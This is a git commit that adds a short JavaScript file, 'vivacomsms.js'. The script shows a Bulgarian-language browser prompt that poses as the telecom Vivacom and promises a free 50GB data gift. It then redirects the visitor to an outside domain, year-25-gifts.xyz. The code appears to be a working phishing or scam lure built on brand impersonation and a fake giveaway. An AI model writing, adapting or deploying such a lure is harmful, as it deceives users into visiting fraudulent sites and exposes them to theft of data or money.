d49cc744d3ed8b7d320f40db87e001a133d837b4
bigetijazz18 <bigetijazz18@gmail.com>
2025-03-15 11:16:41 +0100

    Create vivacomsms.js

---
+++ vivacomsms.js
@@ -0,0 +1,6 @@
+
+var password = 'ИСКАТЕ 50GB'
+password=prompt('VIVACOM: Поздравления, отговаряте на условията за офертата за данни от 50GB OLD SIM. Щракнете върху OK, за да поискате подарък за данни.','ИСКАТЕ 50GB');
+if (password != 'ИСКАТЕ 50GB') {
+location.href='https://www.year-25-gifts.xyz/vivacom50gb';
+}
